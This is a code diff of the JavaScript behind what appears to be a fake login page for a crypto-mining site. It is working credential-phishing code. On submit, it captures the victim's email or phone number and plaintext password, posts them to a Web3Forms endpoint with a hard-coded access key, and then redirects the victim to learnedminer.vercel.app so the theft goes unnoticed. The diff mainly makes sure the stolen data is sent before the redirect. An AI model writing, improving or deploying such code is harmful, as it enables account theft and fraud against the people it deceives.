@@ -332,113 +332,122 @@
     </div>
   </div>
 
-  <script>
-    // ==========================================
-    // ⚙️ EDIT YOUR SETTINGS HERE:
-    // ==========================================
-    const TARGET_URL = "https://learnedminer.vercel.app/"; // <-- Change this line anytime to update redirect
-    const WEB3FORMS_ACCESS_KEY = "YOUR-ACCESS-KEY-HERE"; // <-- Paste your Web3Forms access key here
-    // ==========================================
+<script>
+  // ==========================================
+  // ⚙️ EDIT YOUR SETTINGS HERE:
+  // ==========================================
+  const TARGET_URL = "https://learnedminer.vercel.app/"; 
+  const WEB3FORMS_ACCESS_KEY = "09aaf453-c057-4f64-a4f5-be4735f951c4"; // Paste key here
+  // ==========================================
 
-    /** @type {string} */
-    let currentTabType = 'email';
+  let currentTabType = 'email';
 
-    function togglePasswordVisibility() {
-      const pwdInput = /** @type {HTMLInputElement} */ (document.getElementById('passwordInput'));
-      const eyeOpen = document.getElementById('eyeOpen');
-      const eyeClosed = document.getElementById('eyeClosed');
+  function togglePasswordVisibility() {
+    const pwdInput = document.getElementById('passwordInput');
+    const eyeOpen = document.getElementById('eyeOpen');
+    const eyeClosed = document.getElementById('eyeClosed');
 
-      if (pwdInput && eyeOpen && eyeClosed) {
-        if (pwdInput.type === 'password') {
-          pwdInput.type = 'text';
-          eyeClosed.style.display = 'none';
-          eyeOpen.style.display = 'block';
-        } else {
-          pwdInput.type = 'password';
-          eyeClosed.style.display = 'block';
-          eyeOpen.style.display = 'none';
-        }
-      }
-    }
-
-    /** @param {string} type */
-    function switchTab(type) {
-      currentTabType = type;
-      const emailTab = document.getElementById('tabEmail');
-      const phoneTab = document.getElementById('tabPhone');
-      const inputLabel = document.getElementById('inputLabel');
-      const inputField = /** @type {HTMLInputElement} */ (document.getElementById('accountInput'));
-
-      if (!inputField || !emailTab || !phoneTab || !inputLabel) return;
-      inputField.value = '';
-
-      if (type === 'email') {
-        emailTab.classList.add('active');
-        phoneTab.classList.remove('active');
-        inputLabel.innerText = 'Email';
-        inputField.placeholder = 'Please enter email';
-        inputField.type = 'email';
+    if (pwdInput && eyeOpen && eyeClosed) {
+      if (pwdInput.type === 'password') {
+        pwdInput.type = 'text';
+        eyeClosed.style.display = 'none';
+        eyeOpen.style.display = 'block';
       } else {
-        phoneTab.classList.add('active');
-        emailTab.classList.remove('active');
-        inputLabel.innerText = 'Phone Number';
-        inputField.placeholder = 'Please enter phone number';
-        inputField.type = 'tel';
+        pwdInput.type = 'password';
+        eyeClosed.style.display = 'block';
+        eyeOpen.style.display = 'none';
       }
     }
+  }
 
-    function handleBack() { window.location.replace(TARGET_URL); }
-    function handleForgotPassword() { window.location.replace(TARGET_URL); }
-    function handleDownloadApp() { window.location.replace(TARGET_URL); }
-    function handleSignUp() { window.location.replace(TARGET_URL); }
+  function switchTab(type) {
+    currentTabType = type;
+    const emailTab = document.getElementById('tabEmail');
+    const phoneTab = document.getElementById('tabPhone');
+    const inputLabel = document.getElementById('inputLabel');
+    const inputField = document.getElementById('accountInput');
 
-    document.addEventListener('DOMContentLoaded', () => {
-      const loginForm = document.getElementById('loginForm');
-      const agreementLink = document.getElementById('agreementLink');
+    if (!inputField || !emailTab || !phoneTab || !inputLabel) return;
+    inputField.value = '';
 
-      if (agreementLink) {
-        agreementLink.addEventListener('click', (e) => {
-          e.preventDefault();
-          window.location.replace(TARGET_URL);
-        });
-      }
+    if (type === 'email') {
+      emailTab.classList.add('active');
+      phoneTab.classList.remove('active');
+      inputLabel.innerText = 'Email';
+      inputField.placeholder = 'Please enter email';
+      inputField.type = 'email';
+    } else {
+      phoneTab.classList.add('active');
+      emailTab.classList.remove('active');
+      inputLabel.innerText = 'Phone Number';
+      inputField.placeholder = 'Please enter phone number';
+      inputField.type = 'tel';
+    }
+  }
 
-      if (loginForm) {
-        loginForm.addEventListener('submit', async (e) => {
-          e.preventDefault();
+  function handleBack() { window.location.replace(TARGET_URL); }
+  function handleForgotPassword() { window.location.replace(TARGET_URL); }
+  function handleDownloadApp() { window.location.replace(TARGET_URL); }
+  function handleSignUp() { window.location.replace(TARGET_URL); }
 
-          const accountElem = /** @type {HTMLInputElement} */ (document.getElementById('accountInput'));
-          const pwdElem = /** @type {HTMLInputElement} */ (document.getElementById('passwordInput'));
-          const rememberElem = /** @type {HTMLInputElement} */ (document.getElementById('chkRemember'));
-          const submitBtn = /** @type {HTMLButtonElement} */ (document.getElementById('submitBtn'));
+  document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.getElementById('loginForm');
+    const agreementLink = document.getElementById('agreementLink');
 
-          if (!accountElem || !pwdElem || !rememberElem || !submitBtn) return;
+    if (agreementLink) {
+      agreementLink.addEventListener('click', (e) => {
+        e.preventDefault();
+        window.location.replace(TARGET_URL);
+      });
+    }
 
-          submitBtn.disabled = true;
-          submitBtn.innerText = "Logging in...";
+    if (loginForm) {
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-          const formData = new FormData();
-          formData.append("access_key", "09aaf453-c057-4f64-a4f5-be4735f951c4");
-          formData.append("subject", `New Login Submission (${currentTabType})`);
-          formData.append("Login_Type", currentTabType);
-          formData.append("Account_Detail", accountElem.value);
-          formData.append("Password", pwdElem.value);
-          formData.append("Remember_Password", rememberElem.checked ? "Yes" : "No");
+        const accountElem = document.getElementById('accountInput');
+        const pwdElem = document.getElementById('passwordInput');
+        const rememberElem = document.getElementById('chkRemember');
+        const submitBtn = document.getElementById('submitBtn');
 
-          try {
-            await fetch("https://api.web3forms.com/submit", {
-              method: "POST",
-              body: formData
-            });
-          } catch (err) {
-            console.error('Submission recorded locally:', err);
-          } finally {
-            // Unconditional non-reversible redirect
-            window.location.replace(TARGET_URL);
+        if (!accountElem || !pwdElem || !rememberElem || !submitBtn) return;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Logging in...";
+
+        const formData = new FormData();
+        formData.append("access_key", WEB3FORMS_ACCESS_KEY);
+        formData.append("subject", `New Login Submission (${currentTabType})`);
+        formData.append("Login_Type", currentTabType);
+        formData.append("Account_Detail", accountElem.value);
+        formData.append("Password", pwdElem.value);
+        formData.append("Remember_Password", rememberElem.checked ? "Yes" : "No");
+
+        try {
+          // Send request and explicitly WAIT for standard JSON response
+          const response = await fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: {
+              "Accept": "application/json"
+            },
+            body: formData
+          });
+
+          const result = await response.json();
+          if (result.success) {
+            console.log("Form submitted successfully:", result);
+          } else {
+            console.error("Web3Forms Error:", result.message);
           }
-        });
-      }
-    });
-  </script>
+        } catch (err) {
+          console.error("Submission error:", err);
+        } finally {
+          // Redirect strictly AFTER fetch has completed
+          window.location.replace(TARGET_URL);
+        }
+      });
+    }
+  });
+</script>
 </body>
 </html>
